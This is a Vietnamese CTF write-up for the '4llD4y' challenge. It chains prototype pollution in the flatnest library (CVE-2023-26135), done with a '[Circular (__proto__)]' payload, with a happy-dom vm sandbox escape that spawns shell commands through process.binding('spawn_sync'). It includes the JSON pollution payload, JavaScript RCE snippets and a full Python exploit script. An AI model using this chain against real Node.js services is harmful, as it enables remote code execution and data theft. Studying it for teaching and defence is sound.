# Prototype-Pollute
A CTF challenge about the Prototype Pollution vulnerability


# 4llD4y
![image](https://hackmd.io/_uploads/rJFMR4_IZg.png)
![image](https://hackmd.io/_uploads/rydEC4OUWx.png)

## Phân tích
- Flag được ghi vào một file có tên `/flag_xxxxx.txt` (nằm ở root `/`)
- biến môi trường `$FLAG` bị unset -> RCE để list file trong `/` và đọc

### app.js
![image](https://hackmd.io/_uploads/HyCx1H_8-e.png)

- Sử dụng `express` và `happy-dom`
- endpoint `/config` (POST)
    - Nhận JSON input
    - sử dụng thư viện `flatnest` hàm `nest()` để xử lý object đầu vào 
- endpoint `/render` (POST)
    - nhận `html` string
    - khởi tạo `new Window()` từ `happy-dom`
    - ghi HTML vào document và trả về `outerHTML`
    => Nơi ta execute XSS/JS nhưng mặc định `happy-dom` sẽ tắt execute JS 
    
## Vuln
**1. prototype pollution trong flasnest (CVE-2023-26135)** 
- ![image](https://hackmd.io/_uploads/Hkx1lBuLWe.png)
- Thư viện `flatnest` (v1.0.1) unflatten một object (chuyển key dạng dot-notation `x.y` thành nested object `{x: {y: ...}}`)
- Nhưng nó không lọc các key như `__proto`, `constructor`, `prototype`
- Các payload kiểu cũ `{"__proto__": {"settings": ...}}` -> fail vì `flatnest` sẽ lọc key này
- `flatnest` có một tính năng đặc biệt để hỗ trợ Circular References -> cho phép định nghĩa một chuỗi đặc biệt để trỏ ngược lại object cha
([có tham tham khảo ở đây](https://github.com/brycebaril/node-flatnest/blob/b7d97ec64a04632378db87fcf3577bd51ac3ee39/nest.js))
- `flatnest` parse chuỗi có định dạng `[Circular (path)]`
- nó không validate `path` bên trong `Circular`
- khi ta gửi `"[Circular (__proto__)]"` `flatnest` sẽ phân giải nó và trỏ thẳng vào `Object.prototype` của object hiện tại mà không bị filter key chặn
**2. sandbox escapse/RCE trong happy-dom**
-  khi `enableJavaScriptEvaluation` được bật -> tag `script` trong HTML gửi lên sẽ được execute
-  Vì chạy trong cùng context với note process nên ta có thể dùng `this.constructor.constructor` để lấy `Function` constructor gốc -> gọi ra `process` của nodejs và rce

## Exploit
### prototype pollution
- Dùng `nest()` tại `/config` để pollution `Object.prototype.settings`
``` json
{
    "polluter": "[Circular (__proto__)]",
    "polluter.settings": {},
    "polluter.settings.enableJavaScriptEvaluation": true
}
```
- `flatnest` gán `obj.polluter = obj.__proto__` (tức là `Object.prototype`)
- Nó gán `obj.polluter.settings.enableJavaScriptEvaluation = true`
<=> `Object.prototype.settings = { enableJavaScriptEvaluation: true }`

### RCE
#### sandbox escapse
- sau khi pollute và trả về `{ message: 'configuration applied' }` 
- `happy-dom` sử dụng `vm` module của node.js để chạy script trong tag `<script>`
- `vm` không phải là security sandbox. Context bên trong `vm` vẫn có thể truy cập vào constructor của các object cơ bản ( `Object`, `Function`)
- ta dùng `this.constructor.constructor` (trong đó `this` là window/global scope của VM) sẽ trả về `Function` constructor của host process (node.js chính) cho phép ta thoát khỏi VM context và execute code
#### internal binding
- `process.binding('spawn_sync')` là internal API của node.js được dùng bởi `child_process`. Dùng cái này để bypass nếu module `child_process` bị override hoặc filter, và nó khá ổn để spawn process con (như `/bin/ls` hay `/bin/cat`) trực tiếp

```javascript!
// thoát sandbox, lấy object process của node.js
const process = this.constructor.constructor("return process")();

// lấy internal binding để spawn process
const spawn = process.binding("spawn_sync");

// Cấu hình lệnh
const opts = {
    file: "/bin/ls",
    args: ["ls", "/"],
    envPairs: [],
    stdio: [
        {type:"pipe",readable:true,writable:false},
        {type:"pipe",readable:false,writable:true},
        {type:"pipe",readable:false,writable:true}
    ]
};

// excecute và lấy output
const result = spawn.spawn(opts);

// trả kết quả về client bằng cách ghi đè document body
document.body.innerHTML = String.fromCharCode.apply(null, new Uint8Array(result.output[1]));
```

- Sử dụng lệnh `ls /` để xem tên file flag_*.txt
![image](https://hackmd.io/_uploads/BkaRYhOIWl.png)

- Sau khi tìm được tên flag flag thì thay phần cấu hình thành lệnh cat:
```javascript
...
const opts = {
    file: "/bin/cat",
    args: ["cat", "/flag_510a85c2731f7e49.txt"],
    envPairs: [],
    stdio: [
        {type:"pipe",readable:true,writable:false},
        {type:"pipe",readable:false,writable:true},
        {type:"pipe",readable:false,writable:true}
    ]
};
...
```
![image](https://hackmd.io/_uploads/HyJI92O8-g.png)


## Full script exploit
```python
import requests
import json

# Target config
TARGET_URL = "http://challenges2.ctf.sd:35309" # Đổi IP nếu cần
CMD_TO_RUN = "cat /flag_*.txt" # Lệnh cần chạy để lấy flag

def exploit():
    # Session để giữ kết nối tốt hơn
    s = requests.Session()

    print("[+] Step 1: Performing Prototype Pollution on flatnest...")
    
    # Payload abuse tính năng Circular Reference của flatnest
    # polluter -> Object.prototype
    pollution_payload = {
        "polluter": "[Circular (__proto__)]",
        "polluter.settings": {},
        "polluter.settings.enableJavaScriptEvaluation": True
    }
    
    try:
        r1 = s.post(
            f"{TARGET_URL}/config",
            json=pollution_payload,
            headers={"Content-Type": "application/json"}
        )
        print(f"[*] Pollution Response: {r1.text}")
    except Exception as e:
        print(f"[!] Error sending pollution: {e}")
        return

    print("[+] Step 2: Triggering RCE via Happy DOM...")
    
    # Payload Javascript độc hại để escape sandbox và chạy lệnh hệ thống
    # Dùng process.binding('spawn_sync') để chạy lệnh shell
    js_payload = f"""
    <script>
    try {{
        const process = this.constructor.constructor("return process")();
        const spawn = process.binding("spawn_sync");
        
        // Cấu trúc options cho spawn_sync binding
        const opts = {{
            file: '/bin/sh',
            args: ['sh', '-c', '{CMD_TO_RUN}'],
            envPairs: [],
            stdio: [
                {{type:'pipe',readable:true,writable:false}},
                {{type:'pipe',readable:false,writable:true}},
                {{type:'pipe',readable:false,writable:true}}
            ]
        }};
        
        const result = spawn.spawn(opts);
        
        // result.output[1] là stdout (buffer)
        const output = String.fromCharCode.apply(null, new Uint8Array(result.output[1]));
        const error = String.fromCharCode.apply(null, new Uint8Array(result.output[2]));
        
        document.body.innerHTML = output + error;
    }} catch(e) {{
        document.body.innerHTML = e.toString();
    }}
    </script>
    """
    
    render_payload = {
        "html": js_payload
    }

    try:
        r2 = s.post(
            f"{TARGET_URL}/render",
            json=render_payload,
            headers={"Content-Type": "application/json"}
        )
        
        print("-" * 30)
        print("[FLAG] Output retrieved:")
        print(r2.text)
        print("-" * 30)
        
    except Exception as e:
        print(f"[!] Error triggering RCE: {e}")

if __name__ == "__main__":
    exploit()
```

